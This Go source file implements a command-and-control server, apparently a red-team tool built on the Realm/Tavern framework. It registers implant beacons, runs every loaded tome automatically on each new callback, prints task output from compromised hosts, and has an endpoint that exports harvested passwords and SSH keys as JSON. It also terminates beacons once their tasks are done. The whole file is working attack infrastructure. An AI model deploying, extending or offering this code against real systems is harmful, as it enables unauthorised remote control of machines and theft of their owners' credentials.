package main

import (
	"context"
	"crypto/ecdh"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io/fs"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"entgo.io/ent/dialect/sql"
	"github.com/jessevdk/go-flags"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/net/http2"
	"golang.org/x/net/http2/h2c"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/peer"
	"google.golang.org/grpc/status"
	"realm.pub/tavern/internal/c2"
	"realm.pub/tavern/internal/c2/c2pb"
	"realm.pub/tavern/internal/c2/epb"
	"realm.pub/tavern/internal/cryptocodec"
	"realm.pub/tavern/internal/ent"
	"realm.pub/tavern/internal/ent/beacon"
	"realm.pub/tavern/internal/ent/host"
	"realm.pub/tavern/internal/ent/migrate"
	_ "realm.pub/tavern/internal/ent/runtime"
	"realm.pub/tavern/internal/ent/task"
	"realm.pub/tavern/internal/ent/tome"
	"realm.pub/tavern/tomes"
)

type Options struct {
	DBName     string `short:"d" long:"db-name" description:"Path to the SQLite database file" required:"true"`
	TomesPath  string `short:"t" long:"tomes-path" description:"Path to the Tomes directory" required:"true"`
	ListenAddr string `short:"l" long:"listen" description:"Address to listen on (e.g. :8000)" default:":8000"`
	PrivateKey string `short:"k" long:"private-key" description:"Base64 encoded X25519 private key. If not provided, a random one is generated."`
	CertFile   string `short:"c" long:"cert" description:"Path to TLS certificate file"`
	KeyFile    string `long:"key" description:"Path to TLS key file"`
}

// RakeServer wraps c2.Server to add extended functionality
type RakeServer struct {
	*c2.Server
	client *ent.Client
}

// CredentialExport is the JSON structure for exported credentials
type CredentialExport struct {
	Principal string `json:"principal"`
	Secret    string `json:"secret"`
	Kind      string `json:"kind"`
}

func (s *RakeServer) killBeaconIfNeeded(ctx context.Context, beaconIdentifier string, resp *c2pb.ClaimTasksResponse) bool {
	// If we have no more tasks waiting on output, then issue the kill command
	b, err := s.client.Beacon.Query().
		Where(beacon.IdentifierEQ(beaconIdentifier)).
		Only(ctx)
	if err != nil {
		return false
	}

	unfinishedCount, err := s.client.Task.Query().
		Where(task.HasBeaconWith(beacon.ID(b.ID))).
		Where(task.ExecFinishedAtIsNil()).
		All(ctx)

	if err == nil && len(unfinishedCount) == 0 {
		resp.Tasks = []*c2pb.Task{
			&c2pb.Task{
				Id:        int64(99),
				QuestName: "sshhh",
				Tome: &epb.Tome{
					Eldritch: "agent._terminate_this_process_clowntown()",
				},
			},
		}
		return true
	}
	return false
}

// Hook claim tasks
func (s *RakeServer) ClaimTasks(ctx context.Context, req *c2pb.ClaimTasksRequest) (*c2pb.ClaimTasksResponse, error) {
	exists, _ := s.client.Beacon.Query().
		Where(beacon.IdentifierEQ(req.Beacon.Identifier)).
		Exist(ctx)
	if !exists {
		fmt.Printf("[NEW BEACON] %s %s\n", req.Beacon.Host.PrimaryIp, req.Beacon.Principal)
	}
	// See if we have any tasks to claim
	resp, err := s.Server.ClaimTasks(ctx, req)
	if err != nil {
		return nil, err
	}

	// If we have tasks, return them to the implant
	if len(resp.Tasks) > 0 {
		return resp, nil
	}

	// We dont have any more tasks to claim, if all the tasks are finished, kill the beacon
	if s.killBeaconIfNeeded(ctx, req.Beacon.Identifier, resp) {
		fmt.Printf("[%s] [%s] Beacon complete. Killing\n", req.Beacon.Host.PrimaryIp, req.Beacon.Principal)
	}

	return resp, nil
}

func (s *RakeServer) ReportTaskOutput(ctx context.Context, req *c2pb.ReportTaskOutputRequest) (*c2pb.ReportTaskOutputResponse, error) {
	if req != nil && req.Output != nil && len(req.Output.Output) > 0 {
		fmt.Println(strings.TrimSpace(req.Output.Output))
	}
	return s.Server.ReportTaskOutput(ctx, req)
}

func (s *RakeServer) ReportFile(stream c2pb.C2_ReportFileServer) error {
	s.Server.ReportFile(stream)
	return nil
}
func (s *RakeServer) FetchAsset(req *c2pb.FetchAssetRequest, stream c2pb.C2_FetchAssetServer) error {
	md, _ := metadata.FromIncomingContext(stream.Context())
	fmt.Printf("Stream context metadata: %+v\n", md)
	if strings.HasPrefix(req.Name, "host:credentials") {
		ctx := stream.Context()

		var hostIdentifier string
		if strings.HasPrefix(req.Name, "host:credentials:") {
			hostIdentifier = strings.TrimPrefix(req.Name, "host:credentials:")
		}

		if hostIdentifier == "" {
			return status.Errorf(codes.InvalidArgument, "must specify host identifier in asset name, e.g. host:credentials:<id>")
		}

		h, err := s.client.Host.Query().
			Where(host.IdentifierEQ(hostIdentifier)).
			Only(ctx)
		if ent.IsNotFound(err) {
			return status.Errorf(codes.NotFound, "host not found")
		}
		if err != nil {
			return status.Errorf(codes.Internal, "failed to query host: %v", err)
		}

		creds, err := h.QueryCredentials().All(ctx)
		if err != nil {
			return status.Errorf(codes.Internal, "failed to query credentials: %v", err)
		}

		var export []CredentialExport
		for _, c := range creds {
			kind := "UNKNOWN"
			switch c.Kind {
			case epb.Credential_KIND_PASSWORD:
				kind = "PASSWORD"
			case epb.Credential_KIND_SSH_KEY:
				kind = "SSH_KEY"
			}
			export = append(export, CredentialExport{
				Principal: c.Principal,
				Secret:    c.Secret,
				Kind:      kind,
			})
		}

		data, err := json.MarshalIndent(export, "", "  ")
		if err != nil {
			return status.Errorf(codes.Internal, "failed to marshal credentials: %v", err)
		}

		stream.SetHeader(metadata.Pairs(
			"file-size", fmt.Sprintf("%d", len(data)),
		))

		return stream.Send(&c2pb.FetchAssetResponse{
			Chunk: data,
		})
	}

	return s.Server.FetchAsset(req, stream)
}

func generateSelfSignedCert() (tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			Organization: []string{"Rake C2"},
		},
		NotBefore: time.Now(),
		NotAfter:  time.Now().Add(365 * 24 * time.Hour),

		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})

	return tls.X509KeyPair(certPEM, keyPEM)
}

func getRemoteIP(ctx context.Context) string {
	p, ok := peer.FromContext(ctx)
	if !ok {
		return "unknown"
	}
	host, _, err := net.SplitHostPort(p.Addr.String())
	if err != nil {
		return "unknown"
	}
	return host
}

// loadOrGenerateKeyBytes loads or generates a 32-byte key
// If cliKey is provided, it is used (checking if it's a file path first).
// If cliKey is empty, it checks keyPath.
// If keyPath exists, it loads the key.
// If keyPath does not exist, it generates a new key and saves it to keyPath.
func loadOrGenerateKeyBytes(keyPath string, cliKey string) ([]byte, error) {
	var keyStr string

	// 1. Determine the key string (Base64 encoded)
	if cliKey != "" {
		// Check if cliKey is a file path
		if _, err := os.Stat(cliKey); err == nil {
			content, err := os.ReadFile(cliKey)
			if err != nil {
				return nil, fmt.Errorf("failed to read private key file '%s': %v", cliKey, err)
			}
			keyStr = strings.TrimSpace(string(content))
		} else {
			// Assume it's the raw base64 string
			keyStr = cliKey
		}
	} else {
		// Check default key path
		if _, err := os.Stat(keyPath); err == nil {
			log.Printf("Found existing key at %s, loading...", keyPath)
			content, err := os.ReadFile(keyPath)
			if err != nil {
				return nil, fmt.Errorf("failed to read private key file '%s': %v", keyPath, err)
			}
			keyStr = strings.TrimSpace(string(content))
		}
	}

	// 2. Parse or Generate
	if keyStr != "" {
		keyBytes, err := base64.StdEncoding.DecodeString(keyStr)
		if err != nil {
			return nil, fmt.Errorf("failed to decode private key: %v", err)
		}
		if len(keyBytes) != 32 {
			return nil, fmt.Errorf("invalid key length: expected 32 bytes, got %d", len(keyBytes))
		}
		return keyBytes, nil
	}

	// 3. Generate New
	log.Println("No private key provided and none found at default path, generating a random one...")
	keyBytes := make([]byte, 32)
	if _, err := rand.Read(keyBytes); err != nil {
		return nil, fmt.Errorf("failed to generate random key: %v", err)
	}

	// Save the generated key
	log.Printf("Saving generated private key to %s", keyPath)
	encodedKey := base64.StdEncoding.EncodeToString(keyBytes)
	if err := os.WriteFile(keyPath, []byte(encodedKey), 0600); err != nil {
		log.Printf("Warning: failed to save generated key: %v", err)
	}

	return keyBytes, nil
}

func main() {
	var opts Options
	parser := flags.NewParser(&opts, flags.Default)
	if _, err := parser.Parse(); err != nil {
		if flagsErr, ok := err.(*flags.Error); ok && flagsErr.Type == flags.ErrHelp {
			os.Exit(0)
		}
		os.Exit(1)
	}

	// 1. Setup SQLite Connection
	drv, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?mode=rwc&cache=shared&_fk=1", opts.DBName))
	if err != nil {
		log.Fatalf("failed to open sqlite database: %v", err)
	}
	defer drv.Close()

	client := ent.NewClient(ent.Driver(drv))
	defer client.Close()

	ctx := context.Background()

	// 2. Create Schema (Migrations)
	if err := client.Schema.Create(
		ctx,
		migrate.WithGlobalUniqueID(true),
	); err != nil {
		log.Fatalf("failed to initialize graph schema: %v", err)
	}

	// 3. Load Tomes
	tomesFS := os.DirFS(opts.TomesPath)

	if readDirFS, ok := tomesFS.(fs.ReadDirFS); ok {
		if err := tomes.UploadTomes(ctx, client, readDirFS); err != nil {
			log.Fatalf("failed to upload tomes: %v", err)
		}
	} else {
		log.Fatalf("os.DirFS result does not implement fs.ReadDirFS")
	}

	// 3a. Mark Tomes as Autorun
	_, err = client.Tome.Update().
		Where(tome.RunOnNewBeaconCallback(false)).
		SetRunOnNewBeaconCallback(true).
		Save(ctx)
	if err != nil {
		log.Printf("failed to mark tomes as autorun: %v", err)
	} else {
		log.Println("Marked all tomes as autorun (RunOnNewBeaconCallback).")
	}

	log.Println("Tomes loaded successfully.")

	// 4. Setup Key Pair (Common)
	keyPath := opts.DBName + ".grpc.key"
	rawKey, err := loadOrGenerateKeyBytes(keyPath, opts.PrivateKey)
	if err != nil {
		log.Fatalf("failed to setup keys: %v", err)
	}

	// gRPC (X25519)
	grpcPriv, err := ecdh.X25519().NewPrivateKey(rawKey)
	if err != nil {
		log.Fatalf("failed to create gRPC private key: %v", err)
	}
	grpcPub := grpcPriv.PublicKey()
	log.Printf("Server Public Key: %s", base64.StdEncoding.EncodeToString(grpcPub.Bytes()))

	// JWT for signing assets (Ed25519)
	jwtPriv := ed25519.NewKeyFromSeed(rawKey)
	jwtPub := jwtPriv.Public().(ed25519.PublicKey)

	// 6. Setup gRPC Server
	// We use our custom RakeServer
	baseC2 := c2.New(client, nil, nil, jwtPub, jwtPriv)
	rakeSrv := &RakeServer{
		Server: baseC2,
		client: client,
	}

	xchacha := cryptocodec.StreamDecryptCodec{
		Csvc: cryptocodec.NewCryptoSvc(grpcPriv),
	}

	grpcSrv := grpc.NewServer(
		grpc.ForceServerCodecV2(xchacha),
	)

	c2pb.RegisterC2Server(grpcSrv, rakeSrv)

	// 7. Start Server (TLS)
	log.Printf("Listening on %s ", opts.ListenAddr)

	/*
		var tlsConfig *tls.Config
		log.Println("No TLS keys provided, generating self-signed certificate...")
		cert, err := generateSelfSignedCert()
		if err != nil {
			log.Fatalf("failed to generate self-signed certificate: %v", err)
		}
		tlsConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			NextProtos:   []string{"h2"},
		}
	*/

	lis, err := net.Listen("tcp", opts.ListenAddr)
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}

	//tlsLis := tls.NewListener(lis, tlsConfig)

	// Setup HTTP/1.x / HTTP/2 multiplexer
	mux := http.NewServeMux()
	mux.HandleFunc("/status", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprintf(w, "%s\n", base64.StdEncoding.EncodeToString(grpcPub.Bytes()))
	})

	// Create a handler that routes traffic to gRPC or HTTP mux based on protocol and content type
	rootHandler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.ProtoMajor == 2 && strings.Contains(r.Header.Get("Content-Type"), "application/grpc") {
			grpcSrv.ServeHTTP(w, r)
		} else {
			mux.ServeHTTP(w, r)
		}
	})

	// Use http.Serve instead of grpcSrv.Serve to handle both
	srv := &http.Server{
		Handler: h2c.NewHandler(rootHandler, &http2.Server{}),
	}

	if err := srv.Serve(lis); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}
